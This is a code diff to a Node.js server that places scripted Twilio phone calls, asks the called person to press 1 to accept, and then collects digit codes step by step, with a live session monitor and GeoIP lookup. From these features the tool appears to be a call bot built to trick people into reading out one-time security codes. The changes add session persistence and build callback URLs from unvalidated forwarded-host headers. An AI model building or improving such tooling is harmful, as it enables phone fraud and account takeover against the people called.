@@ -219,7 +219,15 @@ async function makeCall(ctx, to, twimlUrl, statusUrl) {
 }
 
 const callSessions = {};
-function syncLog(s) { const logs=loadLogs(); const i=logs.findIndex(l=>l.callSid===s.callSid); if(i>=0)logs[i]={...logs[i],...s};else logs.unshift(s); saveLogs(logs); }
+function syncLog(s) {
+  // Save to disk
+  const logs=loadLogs();
+  const i=logs.findIndex(l=>l.callSid===s.callSid);
+  if(i>=0)logs[i]={...logs[i],...s};else logs.unshift(s);
+  saveLogs(logs);
+  // Also keep memory in sync
+  callSessions[s.callSid]=s;
+}
 
 
 // ── GeoIP lookup (free, no key needed) ───────────────────────────────────────
@@ -365,7 +373,16 @@ app.post("/api/scripts/:id/setdefault", (req,res) => { const scripts=loadScripts
 app.get("/api/logs",         (req,res) => res.json(loadLogs()));
 app.delete("/api/logs/:id",  (req,res) => { saveLogs(loadLogs().filter(l=>l.id!==req.params.id)); res.json({success:true}); });
 app.delete("/api/logs",      (req,res) => { saveLogs([]); res.json({success:true}); });
-app.get("/api/sessions",     (req,res) => res.json(Object.values(callSessions).sort((a,b)=>new Date(b.startTime)-new Date(a.startTime))));
+app.get("/api/sessions", (req,res) => {
+  // Merge in-memory (current run) + disk logs (previous runs) so monitor always has data
+  const diskLogs = loadLogs();
+  const memSessions = Object.values(callSessions);
+  const memSids = new Set(memSessions.map(s=>s.callSid));
+  // Add disk entries not in memory (from previous server runs)
+  const diskOnly = diskLogs.filter(l=>!memSids.has(l.callSid));
+  const merged = [...memSessions, ...diskOnly].sort((a,b)=>new Date(b.startTime)-new Date(a.startTime));
+  res.json(merged.slice(0,50)); // last 50 calls
+});
 
 // ── Call ──────────────────────────────────────────────────────────────────────
 app.post("/api/call", async (req,res) => {
@@ -418,11 +435,23 @@ app.post("/api/ai-enhance", async (req, res) => {
 
 // ── TwiML ─────────────────────────────────────────────────────────────────────
 function getVoice(){const s=loadSettings();return{voice:s.voice||"alice",language:s.language||"en-US"};}
-function getBase(){const s=loadSettings();const p=s.provider||"twilio";return(s[p]||{}).baseUrl||"";}
+function getBase(req){
+  const s=loadSettings();
+  const p=s.provider||"twilio";
+  const saved=(s[p]||{}).baseUrl||"";
+  if(saved) return saved;
+  // Fallback: build URL from the incoming request (Twilio called us, so this is our public URL)
+  if(req){
+    const proto=req.headers["x-forwarded-proto"]||"https";
+    const host=req.headers["x-forwarded-host"]||req.headers.host||"";
+    if(host) return proto+"://"+host;
+  }
+  return "";
+}
 function getScript(id){const ss=loadScripts();return ss.find(s=>s.id===id)||ss[0];}
 
 app.post("/twiml/start",(req,res)=>{
-  const {voice:v,language:l}=getVoice();const sc=getScript(req.query.sid);const base=getBase();const sid=req.body.CallSid;
+  const {voice:v,language:l}=getVoice();const sc=getScript(req.query.sid);const base=getBase(req);const sid=req.body.CallSid;
   if(callSessions[sid]){callSessions[sid].status="ringing";callSessions[sid].statusDetail="Playing greeting...";syncLog(callSessions[sid]);}
   const {VoiceResponse}=require("twilio").twiml;const t=new VoiceResponse();
   const g=t.gather({numDigits:1,action:base+"/twiml/greet?sid="+sc.id,method:"POST",timeout:sc.greeting.timeout});
@@ -430,14 +459,14 @@ app.post("/twiml/start",(req,res)=>{
   res.type("text/xml").send(t.toString());
 });
 app.post("/twiml/greet",(req,res)=>{
-  const {voice:v,language:l}=getVoice();const sc=getScript(req.query.sid);const base=getBase();const sid=req.body.CallSid;const digit=req.body.Digits;
+  const {voice:v,language:l}=getVoice();const sc=getScript(req.query.sid);const base=getBase(req);const sid=req.body.CallSid;const digit=req.body.Digits;
   const {VoiceResponse}=require("twilio").twiml;const t=new VoiceResponse();
   if(digit==="2"){if(callSessions[sid]){callSessions[sid].status="cancelled";callSessions[sid].statusDetail="Caller declined";syncLog(callSessions[sid]);}t.say({voice:v,language:l},sc.cancelMessage);t.hangup();return res.type("text/xml").send(t.toString());}
   if(digit==="1"){if(callSessions[sid]){callSessions[sid].status="in-progress";callSessions[sid].statusDetail="Accepted";syncLog(callSessions[sid]);}return res.redirect(307,base+"/twiml/step/0?sid="+sc.id);}
   t.say({voice:v,language:l},"Invalid input. "+sc.greeting.message);t.redirect(base+"/twiml/start?sid="+sc.id);res.type("text/xml").send(t.toString());
 });
 app.all("/twiml/step/:idx",(req,res)=>{
-  const {voice:v,language:l}=getVoice();const sc=getScript(req.query.sid);const base=getBase();const idx=parseInt(req.params.idx,10);const step=sc.steps[idx];const sid=req.body.CallSid;
+  const {voice:v,language:l}=getVoice();const sc=getScript(req.query.sid);const base=getBase(req);const idx=parseInt(req.params.idx,10);const step=sc.steps[idx];const sid=req.body.CallSid;
   const {VoiceResponse}=require("twilio").twiml;const t=new VoiceResponse();
   if(!step){if(callSessions[sid]){callSessions[sid].status="completed";callSessions[sid].statusDetail="All steps done";syncLog(callSessions[sid]);}t.say({voice:v,language:l},sc.successMessage);t.hangup();return res.type("text/xml").send(t.toString());}
   if(callSessions[sid]){callSessions[sid].currentStep=idx;callSessions[sid].statusDetail="Waiting: "+step.label;syncLog(callSessions[sid]);}
@@ -445,7 +474,7 @@ app.all("/twiml/step/:idx",(req,res)=>{
   g.say({voice:v,language:l},step.message);t.say({voice:v,language:l},sc.errorMessage);t.hangup();res.type("text/xml").send(t.toString());
 });
 app.post("/twiml/collect/:idx",(req,res)=>{
-  const {voice:v,language:l}=getVoice();const sc=getScript(req.query.sid);const base=getBase();const idx=parseInt(req.params.idx,10);const sid=req.body.CallSid;const digits=req.body.Digits||"";const step=sc.steps[idx];
+  const {voice:v,language:l}=getVoice();const sc=getScript(req.query.sid);const base=getBase(req);const idx=parseInt(req.params.idx,10);const sid=req.body.CallSid;const digits=req.body.Digits||"";const step=sc.steps[idx];
   const {VoiceResponse}=require("twilio").twiml;const t=new VoiceResponse();
   const exp=step.maxDigits;const act=digits.length;
   if(act<exp){t.say({voice:v,language:l},"That code is too short. You entered "+act+" digits but we need "+exp+". Please try again.");const g=t.gather({numDigits:exp,finishOnKey:"#",action:base+"/twiml/collect/"+idx+"?sid="+sc.id,method:"POST",timeout:step.timeout});g.say({voice:v,language:l},step.message);return res.type("text/xml").send(t.toString());}
